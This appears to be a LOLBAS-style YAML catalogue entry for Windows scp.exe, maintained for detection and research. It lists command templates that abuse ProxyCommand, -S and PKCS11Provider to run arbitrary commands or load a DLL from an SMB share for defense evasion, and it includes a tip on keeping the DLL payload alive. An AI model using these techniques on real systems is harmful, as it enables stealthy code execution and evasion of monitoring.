---
Name: scp.exe
Description: Used for uploading or downloading files over SSH.
Author: BinFault
Created: 2026-06-03
Commands:
  - Command: scp.exe -o ProxyCommand="{CMD}" . localhost:.
    Description: Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost (or any other address specified).
    Usecase: Proxy execution of specified command, can be used as a defensive evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 11
    Tags:
      - Execute: CMD
  - Command: scp.exe -S "{CMD}" . localhost:.
    Description: Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost (or any other address specified).
    Usecase: Proxy execution of specified command, can be used as a defensive evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 11
    Tags:
      - Execute: CMD
  - Command: scp -o PKCS11Provider="\\127.0.0.1\Temp\Example.dll" . wind@github.com:.
    Description: Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by `scp.exe`.
    Usecase: Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 11
    Tags:
      - Execute: DLL
      - Execute: Remote
Full_Path:
  - Path: C:\Windows\System32\OpenSSH\scp.exe
Detection:
  - IOC: "`scp.exe` executions referencing `ProxyCommand`."
Resources:
